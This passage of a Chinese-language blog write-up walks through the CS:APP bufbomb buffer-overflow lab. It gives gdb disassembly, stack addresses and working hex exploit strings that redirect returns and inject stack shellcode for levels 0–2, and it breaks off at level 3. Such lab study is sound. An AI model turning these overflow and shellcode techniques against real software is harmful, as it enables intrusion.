-<h3 id="Using-bufbomb-program"><a href="#Using-bufbomb-program" class="headerlink" title="Using bufbomb program"></a>Using bufbomb program</h3><p>在bufbomb.c文件中有getbuf函数，Gets函数与c标准库中的gets函数功能类似，读取’\n’为结尾的字符串并存储在特定位置，这两个函数只是对字符串进行简单复制而不会进行越界检查，所以主要是通过这个字符串进行溢出攻击。代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">unsigned long long getbuf() &#123;</span><br><span class="line">   char buf[36];</span><br><span class="line">   volatile char* variable_length;</span><br><span class="line">   int i;</span><br><span class="line">   unsigned long long val = (unsigned long long)Gets(buf);</span><br><span class="line">   variable_length = alloca((val % 40) &lt; 36 ? 36 : val % 40);</span><br><span class="line">   for(i = 0; i &lt; 36; i++) &#123;</span><br><span class="line">      variable_length[i] = buf[i];</span><br><span class="line">   &#125;</span><br><span class="line">   return val % 40;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h3 id="Formatting-Strings"><a href="#Formatting-Strings" class="headerlink" title="Formatting Strings"></a>Formatting Strings</h3><p>执行bufbomb文件需要按照<code>./bufbomb -u qlbaird</code>格式，之后还要输入ascii码串。sendstring文件可以将十六进制字符串转换为ascii码串，可以通过管道或I/O重定向实现整个过程：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat exploits.txt | ./sendstring | ./bufbomb -u qlbaird</span><br><span class="line"></span><br><span class="line">./sendstring &lt; exploits.txt &gt; exploits.bytes</span><br></pre></td></tr></table></figure></p>
-<p>使用gdb进行调试时，可以将一系列操作写入文件，再使用-x command.txt命令执行。</p>
-<h3 id="Generating-byte-codes"><a href="#Generating-byte-codes" class="headerlink" title="Generating byte codes"></a>Generating byte codes</h3><p>使用gcc作为assembler，objdump作为disassembler可以方便的生成指令序列的字节码，example.s代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Example of hand-generated assembly code</span><br><span class="line">movq $0x1234abcd,%rax    # Move 0x1234abcd to %rax</span><br><span class="line">pushq $0x401080          # Push 0x401080 on to the stack</span><br><span class="line">retq                     # Return</span><br></pre></td></tr></table></figure></p>
-<p>可以汇编和反汇编文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c example.s</span><br><span class="line">$ objdump -d example.o &gt; example.d</span><br></pre></td></tr></table></figure></p>
-<p>最终生成的example.d内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:	48 c7 c0 cd ab 34 12 	mov    $0x1234abcd,%rax</span><br><span class="line">7:	68 80 10 40 00       	pushq  $0x401080</span><br><span class="line">c:	c3                   	retq</span><br></pre></td></tr></table></figure></p>
-<p>每一行都代表一条指令，左边的数字代表起始地址（从0开始），冒号后面为每条指令的字节码。小端机器高位字符放置在低地址中，所以以上代码生成的字节序列为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c0 cd ab 34 12 68 80 10 40 00 c3</span><br></pre></td></tr></table></figure></p>
-<h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p>总共分成四个小部分，难度是不断递增的。</p>
-<h4 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h4><p>在bufbomb文件中，getbuf函数通过test函数进行调用:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">void test()</span><br><span class="line">&#123;</span><br><span class="line">   volatile unsigned long long val;</span><br><span class="line">   volatile unsigned long long local = 0xdeadbeef;</span><br><span class="line">   char* variable_length;</span><br><span class="line">   entry_check(3);  /* Make sure entered this function properly */</span><br><span class="line">   val = getbuf();</span><br><span class="line">   if (val &lt;= 40) &#123;</span><br><span class="line">      variable_length = alloca(val);</span><br><span class="line">   &#125;</span><br><span class="line">   entry_check(3);</span><br><span class="line">   /* Check for corrupted stack */</span><br><span class="line">   if (local != 0xdeadbeef) &#123;</span><br><span class="line">      printf(&quot;Sabotaged!: the stack has been corrupted\n&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   else if (val == cookie) &#123;</span><br><span class="line">      printf(&quot;Boom!: getbuf returned 0x%llx\n&quot;, val);</span><br><span class="line">      if (local != 0xdeadbeef) &#123;</span><br><span class="line">         printf(&quot;Sabotaged!: the stack has been corrupted\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      if (val != cookie) &#123;</span><br><span class="line">         printf(&quot;Sabotaged!: control flow has been disrupted\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      validate(3);</span><br><span class="line">   &#125;</span><br><span class="line">   else &#123;</span><br><span class="line">      printf(&quot;Dud: getbuf returned 0x%llx\n&quot;, val);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>当函数getbuf执行返回语句时，正常情况下应该返回到test函数中。本次的任务是返回到一个新的函数smoke，而不是返回到test。主要方法是使用字符串将栈中的返回地址覆盖。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void smoke()</span><br><span class="line">&#123;</span><br><span class="line">    entry_check(0); /* Make sure entered this function properly */</span><br><span class="line">    printf(&quot;Smoke!: You called smoke()\n&quot;);</span><br><span class="line">    validate(0);</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>首先使用gdb设置断点（b 行号设置断点，c运行到断点位置）到getbuf函数返回位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x0000000000400da0 &lt;+0&gt;:	push   %rbp</span><br><span class="line">   0x0000000000400da1 &lt;+1&gt;:	mov    %rsp,%rbp</span><br><span class="line">   0x0000000000400da4 &lt;+4&gt;:	sub    $0x30,%rsp</span><br><span class="line">   0x0000000000400da8 &lt;+8&gt;:	lea    -0x30(%rbp),%rdi</span><br><span class="line">   0x0000000000400dac &lt;+12&gt;:	callq  0x400cb0 &lt;Gets&gt;</span><br><span class="line">   0x0000000000400db1 &lt;+17&gt;:	movabs $0xcccccccccccccccd,%rdx</span><br><span class="line">   0x0000000000400dbb &lt;+27&gt;:	mov    %rax,%rcx</span><br><span class="line">   0x0000000000400dbe &lt;+30&gt;:	mul    %rdx</span><br><span class="line">   0x0000000000400dc1 &lt;+33&gt;:	shr    $0x5,%rdx</span><br><span class="line">   0x0000000000400dc5 &lt;+37&gt;:	lea    (%rdx,%rdx,4),%rax</span><br><span class="line">   0x0000000000400dc9 &lt;+41&gt;:	mov    %rcx,%rdx</span><br><span class="line">   0x0000000000400dcc &lt;+44&gt;:	shl    $0x3,%rax</span><br><span class="line">   0x0000000000400dd0 &lt;+48&gt;:	sub    %rax,%rdx</span><br><span class="line">   0x0000000000400dd3 &lt;+51&gt;:	mov    $0x24,%eax</span><br><span class="line">   0x0000000000400dd8 &lt;+56&gt;:	cmp    $0x24,%rdx</span><br><span class="line">   0x0000000000400ddc &lt;+60&gt;:	cmovae %rdx,%rax</span><br><span class="line">   0x0000000000400de0 &lt;+64&gt;:	xor    %ecx,%ecx</span><br><span class="line">   0x0000000000400de2 &lt;+66&gt;:	add    $0x1e,%rax</span><br><span class="line">   0x0000000000400de6 &lt;+70&gt;:	and    $0xfffffffffffffff0,%rax</span><br><span class="line">   0x0000000000400dea &lt;+74&gt;:	sub    %rax,%rsp</span><br><span class="line">   0x0000000000400ded &lt;+77&gt;:	lea    0xf(%rsp),%r8</span><br><span class="line">   0x0000000000400df2 &lt;+82&gt;:	and    $0xfffffffffffffff0,%r8</span><br><span class="line">   0x0000000000400df6 &lt;+86&gt;:	nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">   0x0000000000400e00 &lt;+96&gt;:	movzbl -0x30(%rbp,%rcx,1),%edi</span><br><span class="line">   0x0000000000400e05 &lt;+101&gt;:	lea    (%r8,%rcx,1),%rsi</span><br><span class="line">   0x0000000000400e09 &lt;+105&gt;:	add    $0x1,%rcx</span><br><span class="line">   0x0000000000400e0d &lt;+109&gt;:	cmp    $0x24,%rcx</span><br><span class="line">   0x0000000000400e11 &lt;+113&gt;:	mov    %dil,(%rsi)</span><br><span class="line">   0x0000000000400e14 &lt;+116&gt;:	jne    0x400e00 &lt;getbuf+96&gt;</span><br><span class="line">   0x0000000000400e16 &lt;+118&gt;:	mov    %rdx,%rax</span><br><span class="line">   0x0000000000400e19 &lt;+121&gt;:	leaveq</span><br><span class="line">=&gt; 0x0000000000400e1a &lt;+122&gt;:	retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></p>
-<p>使用<code>x /x $rsp</code>查看栈顶指针rsp，rsp存放着当前栈顶的地址0x7fffffffbed8，地址指向函数返回地址0x00400ef3。使用<code>objdump bufbomb -d bufbomb_disas</code>可以生成bufbomb的反汇编代码，通过反汇编代码可以得知地址0x00400ef3指向的位置为test函数,即为调用getbuf函数的下一行代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0000000000400ed0 &lt;test&gt;:</span><br><span class="line">  400ed0:   55                      push   %rbp</span><br><span class="line">  400ed1:   b9 ef be ad de          mov    $0xdeadbeef,%ecx</span><br><span class="line">  400ed6:   31 c0                   xor    %eax,%eax</span><br><span class="line">  400ed8:   48 89 e5                mov    %rsp,%rbp</span><br><span class="line">  400edb:   53                      push   %rbx</span><br><span class="line">  400edc:   48 83 ec 18             sub    $0x18,%rsp</span><br><span class="line">  400ee0:   48 89 4d e8             mov    %rcx,-0x18(%rbp)</span><br><span class="line">  400ee4:   c7 05 c2 13 20 00 03    movl   $0x3,0x2013c2(%rip)</span><br><span class="line">  400eeb:   00 00 00</span><br><span class="line">  400eee:   e8 ad fe ff ff          callq  400da0 &lt;getbuf&gt;</span><br><span class="line">  400ef3:   48 83 f8 28             cmp    $0x28,%rax</span><br><span class="line">  400ef7:   76 47                   jbe    400f40 &lt;test+0x70&gt;</span><br></pre></td></tr></table></figure></p>
-<p>因此我们只需要将栈顶位置存放的值更改为smoke函数的地址即可。Gets函数将输入字符串存储到buf字符数组中，Gets函数以‘\n’为结束符并不会进行越界检查，所以我们可以通过输入字符串进行溢出攻击。获取字符数组buf地址如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x /x buf</span><br><span class="line">0x7fffffffbea0:	0x00563412</span><br></pre></td></tr></table></figure></p>
-<p>buf数组的首地址为0x7fffffffbea0，与getbuf函数返回时的栈顶指针地址相差56个字节。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x /16xw buf</span><br><span class="line">0x7fffffffbea0:	0x00563412	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x7fffffffbeb0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x7fffffffbec0:	0xffffc020	0x00007fff	0xf7de45c4	0x00007fff</span><br><span class="line">0x7fffffffbed0:	0xffffbf00	0x00007fff	0x00400ef3	0x00000000</span><br></pre></td></tr></table></figure></p>
-<p>所以只需将输入字符串设为64字节，并将0x7fffffffbed8地址的内容设为smoke函数的首地址0x4010c0即可,注意栈的顺序是从高地址向地址的，而此处的字符串是从低地址向高地址存放的，所以并不会破坏栈的结构。：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00000000004010c0 &lt;smoke&gt;:</span><br><span class="line">  4010c0:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  4010c4:   bf 45 13 40 00          mov    $0x401345,%edi</span><br><span class="line">  4010c9:   c7 05 dd 11 20 00 00    movl   $0x0,0x2011dd(%rip)</span><br><span class="line">  4010d0:   00 00 00</span><br><span class="line">  4010d3:   e8 08 f7 ff ff          callq  4007e0 &lt;puts@plt&gt;</span><br><span class="line">  4010d8:   31 ff                   xor    %edi,%edi</span><br><span class="line">  4010da:   e8 51 fd ff ff          callq  400e30 &lt;validate&gt;</span><br><span class="line">  4010df:   31 ff                   xor    %edi,%edi</span><br><span class="line">  4010e1:   e8 da f7 ff ff          callq  4008c0 &lt;exit@plt&gt;</span><br><span class="line">  4010e6:   66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">  4010ed:   00 00 00</span><br></pre></td></tr></table></figure></p>
-<p>所以将字符串设置如下即可解决此问题(前56个字节的内容任意，在64位机器上运行，所以地址为8个字节)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 c0 10 40 00 00 00 00 00</span><br></pre></td></tr></table></figure></p>
-<p>运行结果为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">smoke.txt</span><br><span class="line">Username: qlbaird</span><br><span class="line">de</span><br><span class="line">77</span><br><span class="line">8d</span><br><span class="line">5c</span><br><span class="line">6d</span><br><span class="line">78</span><br><span class="line">5f</span><br><span class="line">51</span><br><span class="line">Cookie: 0x515f786d5c8d77de</span><br><span class="line">Smoke!: You called smoke()</span><br><span class="line">Level 0 VALID</span><br></pre></td></tr></table></figure></p>
-<h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p>与level0类似，level1要求getbuf函数返回到fizz函数，而不是返回到test函数，不同的是fizz函数中有七个参数，第七个参数的值与id相同。需要保证参数的正确传递。</p>
-<p>要特别注意x86-64中前六个参数是通过寄存器进行传递的，顺序如下：<code>rdi,rsi,rdx,rcx,r8,r9</code>，之后的参数是通过栈传递的，所以本问题中传递id的参数是保存在栈中的，fizz函数的反汇编代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function fizz:</span><br><span class="line">=&gt; 0x0000000000401070 &lt;+0&gt;:	sub    $0x8,%rsp</span><br><span class="line">   0x0000000000401074 &lt;+4&gt;:	movl   $0x1,0x201232(%rip)        # 0x6022b0 &lt;check_level&gt;</span><br><span class="line">   0x000000000040107e &lt;+14&gt;:	mov    0x10(%rsp),%rsi</span><br><span class="line">   0x0000000000401083 &lt;+19&gt;:	cmp    0x201296(%rip),%rsi        # 0x602320 &lt;cookie&gt;</span><br><span class="line">   0x000000000040108a &lt;+26&gt;:	je     0x40109f &lt;fizz+47&gt;</span><br><span class="line">   0x000000000040108c &lt;+28&gt;:	mov    $0x4015b0,%edi</span><br><span class="line">   0x0000000000401091 &lt;+33&gt;:	xor    %eax,%eax</span><br><span class="line">   0x0000000000401093 &lt;+35&gt;:	callq  0x4007f0 &lt;printf@plt&gt;</span><br><span class="line">   0x0000000000401098 &lt;+40&gt;:	xor    %edi,%edi</span><br><span class="line">   0x000000000040109a &lt;+42&gt;:	callq  0x4008c0 &lt;exit@plt&gt;</span><br><span class="line">   0x000000000040109f &lt;+47&gt;:	mov    $0x401590,%edi</span><br><span class="line">   0x00000000004010a4 &lt;+52&gt;:	xor    %eax,%eax</span><br><span class="line">   0x00000000004010a6 &lt;+54&gt;:	callq  0x4007f0 &lt;printf@plt&gt;</span><br><span class="line">   0x00000000004010ab &lt;+59&gt;:	mov    $0x1,%edi</span><br><span class="line">   0x00000000004010b0 &lt;+64&gt;:	callq  0x400e30 &lt;validate&gt;</span><br><span class="line">   0x00000000004010b5 &lt;+69&gt;:	jmp    0x401098 &lt;fizz+40&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></p>
-<p>getbuf函数中执行ret指令时栈顶地址的值0x7fffffffbed8，将栈顶地址指向的值修改为fizz函数的地址0x401070,即可返回到fizz函数。<br>在汇编中call与ret指令通常成对出现，它们的作用为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call：将下一条指令的地址（即为函数返回地址，通过指向当前指令的rip寄存器）入栈，栈顶指针rsp会减小，修改寄存器rip的值为调用函数地址。</span><br><span class="line"></span><br><span class="line">ret：将返回地址出栈，并赋值给寄存器rip，同时栈顶指针rsp增加。</span><br></pre></td></tr></table></figure></p>
-<p>在getbuf函数执行ret指令后，栈顶地址增加为0x7fffffffbee0，返回到fizz函数，结合fizz函数反汇编代码，先将rsp的值减少0x8，然后再将0x10(%rsp)中的值与id进行比较，所以id存放的地址应为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffbed8 + 0x8 - 0x8 + 0x10 = 0x7fffffffbee8</span><br></pre></td></tr></table></figure></p>
-<p>所以输入字符串为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 70 10 40 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 de 77 8d 5c 6d 78 5f 51</span><br></pre></td></tr></table></figure></p>
-<p>运行结果为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fizz.txt</span><br><span class="line">Username: qlbaird</span><br><span class="line">de</span><br><span class="line">77</span><br><span class="line">8d</span><br><span class="line">5c</span><br><span class="line">6d</span><br><span class="line">78</span><br><span class="line">5f</span><br><span class="line">51</span><br><span class="line">Cookie: 0x515f786d5c8d77de</span><br><span class="line">Fizz!: You called fizz(0x515f786d5c8d77de)</span><br><span class="line">Level 1 VALID</span><br></pre></td></tr></table></figure></p>
-<h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p>更复杂的攻击方法是将机器指令写入字符串，然后将函数跳转到此位置执行代码，这种形式的攻击可以让程序做到更多事情。bang函数的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">unsigned long long global_value = 0;</span><br><span class="line">void bang(unsigned long long val)</span><br><span class="line">&#123;</span><br><span class="line">    entry_check(2); /* Make sure entered this function properly */</span><br><span class="line">    if (global_value == cookie)</span><br><span class="line">    &#123;</span><br><span class="line">       printf(&quot;Bang!: You set global_value to 0x%llx\n&quot;, global_value);</span><br><span class="line">       validate(2);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Misfire: global_value = 0x%llx\n&quot;, global_value);</span><br><span class="line">    &#125;</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>与level0和level1类似，要求getbuf函数返回到bang函数而不是test函数，但要求将全局变量的值设为id。在level2中使用gdb才能成功，因为执行栈上的代码通常是被禁止的。</p>
-<p>解决过程如下：</p>
-<ol>
-<li>获取全局变量global_value的地址（全局变量存储在静态存储区），将全局变量赋值代码(类似于 mov $id, dest)的机器码写入字符串。</li>
-<li>修改getbuf函数返回地址为机器码执行地址。</li>
-<li>注意栈顶指针的变化，将机器码部分返回地址赋值为bang函数地址。</li>
-</ol>
-<p>首先获取全局变量global_value的地址,通过objdump bufbomb -t bufbomb_symtab指令可以获得bufbomb中的符号列表，可以查到变量的地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000602308 g     O .bss   0000000000000008    global_value</span><br></pre></td></tr></table></figure></p>
-<p>global_value的地址为0x602308，字符串中的机器码如下（通过Generating byte codes部分的方法生成）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">48 c7 04 25 08 23 60    movq   $0x5c8d77de,0x602308</span><br><span class="line">00 de 77 8d 5c</span><br><span class="line">48 c7 04 25 0c 23 60    movq   $0x515f786d,0x60230c</span><br><span class="line">00 6d 78 5f 51</span><br><span class="line">c3                      retq</span><br></pre></td></tr></table></figure></p>
-<p>我将机器码写入字符串的起始位置，即buf首地址0x7fffffffbea0，需要注意的是小端机器数据的高位放置在地址的低位，所以机器码顺序为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">48 c7 04 25 08 23 60 00 de 77 8d 5c 48 c7 04 25 0c 23 60 00 6d 78 5f 51 c3</span><br></pre></td></tr></table></figure></p>
-<p>同时要将getbuf函数返回地址设置为buf首地址，即将0x7fffffffbed8地址指向内容更改为0x7fffffffbea0。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x /3iw $rip</span><br><span class="line">=&gt; 0x7fffffffbea0:	movq   $0x5c8d77de,0x602308</span><br><span class="line">   0x7fffffffbeac:	movq   $0x515f786d,0x60230c</span><br><span class="line">   0x7fffffffbeb8:	retq</span><br></pre></td></tr></table></figure></p>
-<p>机器码执行后需要返回到bang函数首地址，所以需要修改rsp的值，从getbuf函数返回到字符串机器码执行了ret指令，所以此时栈顶地址为0x7fffffffbee0，只需将栈顶地址指向内容修改为bang函数首地址即可，bang函数首地址为0x401020：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000000000401020 &lt;bang&gt;:</span><br><span class="line">  401020:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  401024:   48 8b 35 dd 12 20 00    mov    0x2012dd(%rip),%rsi        # 602308 &lt;global_value&gt;</span><br><span class="line">  40102b:   48 3b 35 ee 12 20 00    cmp    0x2012ee(%rip),%rsi        # 602320 &lt;cookie&gt;</span><br><span class="line">  401032:   c7 05 74 12 20 00 02    movl   $0x2,0x201274(%rip)        # 6022b0 &lt;check_level&gt;</span><br><span class="line">  401039:   00 00 00</span><br><span class="line">  40103c:   74 13                   je     401051 &lt;bang+0x31&gt;</span><br></pre></td></tr></table></figure></p>
-<p>所以输入的字符串为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">48 c7 04 25 08 23 60 00 de 77 8d 5c 48 c7 04 25</span><br><span class="line">0c 23 60 00 6d 78 5f 51 c3 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 a0 be ff ff ff 7f 00 00</span><br><span class="line">20 10 40 00 00 00 00 00</span><br></pre></td></tr></table></figure></p>
-<p>运行结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bang.txt</span><br><span class="line">Username: qlbaird</span><br><span class="line">de</span><br><span class="line">77</span><br><span class="line">8d</span><br><span class="line">5c</span><br><span class="line">6d</span><br><span class="line">78</span><br><span class="line">5f</span><br><span class="line">51</span><br><span class="line">Cookie: 0x515f786d5c8d77de</span><br><span class="line">Bang!: You set global_value to 0x515f786d5c8d77de</span><br><span class="line">Level 2 VALID</span><br></pre></td></tr></table></figure></p>
-<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>最为复杂的攻击方式是在程序执行完自己添加的机器码后仍返回到原始调用函数并且修补还原为正常执行的栈结构，主要是确保rsp与rbp值的正确，level3要求getbuf函数最终返回到test函数，但是需要将原本未赋值的变量val赋值为id，并且将栈还原为正常执行的栈结构。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">void test()</span><br><span class="line">&#123;</span><br><span class="line">   volatile unsigned long long val;</span><br><span class="line">   volatile unsigned long long local = 0xdeadbeef;</span><br><span 